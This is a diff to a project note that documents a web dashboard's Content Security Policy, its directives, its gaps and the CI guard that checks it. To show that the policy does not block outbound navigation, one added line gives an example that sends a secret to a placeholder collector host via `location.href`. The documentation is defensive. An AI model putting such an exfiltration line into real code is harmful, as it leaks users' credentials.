@@ -1,6 +1,6 @@
 ---
 name: dashboard-shell-csp
-description: 'The dashboard shell CSP after #195 — what each directive is for, why style-src carries unsafe-inline and img-src exists at all (both measured, neither a control, do not report either as a weakness), that script-src has no unsafe-* and connect-src is self, and what a change here has to re-verify in a browser rather than by reading the header'
+description: 'The dashboard shell CSP after #195 — what each directive is for, why style-src carries unsafe-inline and img-src exists at all (both measured, neither a control, do not report either as a weakness), that script-src has no unsafe-* and connect-src is self, what the policy does NOT bound (outbound navigation and WebRTC are outside CSP, so exfiltration is harder not closed — a finding saying so is correct), that every HTML document including /login carries it, and what a change here has to re-verify in a browser rather than by reading the header'
 metadata:
   type: project
 ---
@@ -35,6 +35,23 @@ dependency bump would break it silently.
 probes `/favicon.ico` unasked — measured: with the directive the request is made, and with it
 removed from the same build the request never leaves.
 
+**What the policy does NOT bound, so the bound is not cited as wider than it is.** `connect-src`
+covers `fetch`/XHR/`sendBeacon`/`EventSource`, and `img-src`/`form-action` cover the unscripted
+carriers — but **no CSP directive in a shipping browser restricts outbound navigation**, so
+`location.href = 'https://collector/' + secret` and `window.open` still leave with the credential
+(`navigate-to` was specified and dropped). WebRTC is outside `connect-src` too and `webrtc 'block'`
+is deliberately not set — closing it alone changes nothing while navigation is open. Exfiltration is
+therefore **harder and quieter, not closed**, and a finding saying so is correct rather than a
+re-report of something settled. This note previously said the credential had "nowhere to go"; that
+was wrong and was corrected in the same PR.
+
+**Every HTML document carries the policy, not just the shell.** `DOCUMENT_HEADERS` is applied by
+`static_handler`'s two arms *and* by `/login`'s `401` refusal page. That last one matters because a
+CSP binds the document it is served with, so a policy-free same-origin document is an escape from
+this policy rather than a gap beside it — a script could open it and run there unbound. The e2e
+test covers `/login?token=wrong` for that reason. Responses deliberately without it: `/healthz` and
+the two 404 arms (`text/plain`), `/api/*` (JSON), and `/login`'s `303` (no rendered body).
+
 **The invariant worth defending on any edit here** (it outlives the exact policy string): no
 `'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'` or `*` in `script-src`, and `connect-src`
 stays `'self'`. The e2e test asserts both separately from the verbatim pin for that reason.
@@ -53,5 +70,10 @@ dashboard only in the JS job, so `cargo test` runs against the script-less place
 `crates/honmoon-mgmt/build.rs` writes — a Rust assertion about inline script there would pass
 vacuously. `scripts/check-dashboard-csp.ts` is the guard instead: it runs after `bun run build` and
 `bun demo/build.ts` in CI and refuses an inline `<script>`, an off-origin `src`/`href`, an inline
-handler, a `<base>`, a `<form>` — and a shell with no `<script>` at all, which is how it refuses to
-pass on that placeholder.
+handler, a `<base>`, a `<form>`, a `<script>` opening tag it could not read to a `</script>` — and a
+shell with no `<script>` at all, which is how it refuses to pass on that placeholder.
+
+**That guard reads the shell HTML only, not the emitted bundle**, so it would not catch a dependency
+that introduces `eval(`/`new Function(` — which `script-src 'self'` refuses, since no `'unsafe-eval'`
+is present. Verified absent from today's bundle; tracked as a follow-up, so a finding about the
+*bundle* is in scope while one about the shell's script tags is not.
